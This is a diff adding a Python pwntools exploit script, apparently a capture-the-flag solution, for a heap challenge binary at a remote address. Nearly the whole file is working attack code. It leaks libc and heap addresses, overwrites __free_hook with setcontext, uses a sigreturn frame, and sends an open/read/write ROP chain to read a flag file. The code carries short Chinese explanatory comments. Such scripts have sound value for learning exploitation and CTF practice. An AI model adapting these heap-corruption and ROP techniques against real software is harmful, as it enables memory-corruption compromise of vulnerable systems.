@@ -1,0 +1,117 @@
+#!/usr/bin/python
+#coding=utf-8
+from PwnContext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+# context.log_level = 'debug'
+
+s       = lambda data               :ctx.send(str(data))
+sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
+sl      = lambda data               :ctx.sendline(str(data)) 
+sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
+r       = lambda numb=4096          :ctx.recv(numb)
+ru      = lambda delims, drop=False  :ctx.recvuntil(delims, drop)
+irt     = lambda                    :ctx.interactive()
+rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
+dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
+
+uu32    = lambda data   :u32(data.ljust(4, '\x00'))
+uu64    = lambda data   :u64(data.ljust(8, '\x00'))
+leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
+def lg(s,addr):
+    print '\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr)
+
+ctx.binary = './pwn'
+ctx.remote=('219.219.61.234',10017)
+ctx.custom_lib_dir = './lib'
+ctx.debug_remote_libc = True
+ctx.symbols = {'heap':0x203080,'flag':0x203060,'cnt':0x203064}
+ctx.breakpoints = [0x1557]
+def menu(chi):
+	sla('>>>',str(chi))
+def add(name,num,len,info):
+	menu(1)
+	sla(':\n',name)
+	sla(':\n',str(num))
+	sla(':\n',str(len))
+	sa(':\n',info)
+def edit(num,chi,name,len=0,info=''):
+	menu(2)
+	sla(':\n',str(num))
+	sla('> ',str(chi))
+	if chi==1:
+		sa(':\n',str(name))
+	elif chi==2:
+		sla('Info:\n',str(len))
+		sa('info:\n',info)
+
+def remove(num):
+	menu(3)
+	sla(':\n',str(num))
+
+def show(num):
+	menu(4)
+	sla(':\n',str(num))
+
+rs()
+libc = ctx.libc
+sa('String1:\n','\x02\x01ef\n')
+sa('String2:\n','\x01\x26ef\n')
+add('flag\x00\x00',1,0x80,'a1gx')
+add('bbb',2,0x18,'a1gx')	#当usorted bin被top chunk合并时，会触发malloc_consolidate，将fast bin合并并放入unsorted bin中
+add('bbb',3,0x18,'a1gx')
+edit(1,2,'',0,'')
+show(1)
+ru('Info:')
+libc_base = uu64(ru('\x7f'))-0x3c4b78
+libc.address = libc_base
+lg('libc_base',libc_base)
+free_hook = libc.sym['__free_hook']
+lg('free_hook',free_hook)
+edit(3,2,'',0,'')
+edit(2,2,'',0,'')
+show(2)
+ru('Info:')
+heap_base = uu64(ru('\n',drop=True))-0x1d0
+lg('heap_base',heap_base)
+syscall = libc.search(asm('syscall\nret')).next()
+frame = SigreturnFrame()
+frame.rdi=0
+frame.rsi=free_hook&0xfffffffffffff000
+frame.rdx=0x2000
+frame.rsp=free_hook&0xfffffffffffff000
+frame.rip=syscall
+add('aaa',4,0x100,str(frame))
+edit(2,2,'',0x18,p64(free_hook))
+
+edit(4,1,p64(libc.sym['setcontext']+53))
+edit(2,2,'',0x18,p64(heap_base+0x200))
+# dbg()
+remove(4)
+# 返回地址是在调用函数之前存入栈上的
+layout = [
+    libc.search(asm('pop rdi\nret')).next(),
+    heap_base+0x30,
+    libc.search(asm('pop rsi\nret')).next(),
+    0,
+    libc.sym['open'],
+    libc.search(asm('pop rdi\nret')).next(),
+    3, # read函数第一个参数为3时,指从rax(也就是上一个函数返回值)所指向的文件读入数据
+    libc.search(asm('pop rsi\nret')).next(),
+    heap_base+0x30,
+    libc.search(asm('pop rdx\nret')).next(),
+    0x100,
+    libc.sym['read'],
+    libc.search(asm('pop rdi\nret')).next(),
+    1,
+    libc.search(asm('pop rsi\nret')).next(),
+    heap_base+0x30,
+    libc.search(asm('pop rdx\nret')).next(),
+    0x50,
+    libc.sym['write']
+]
+
+
+sl(flat(layout))
+irt()
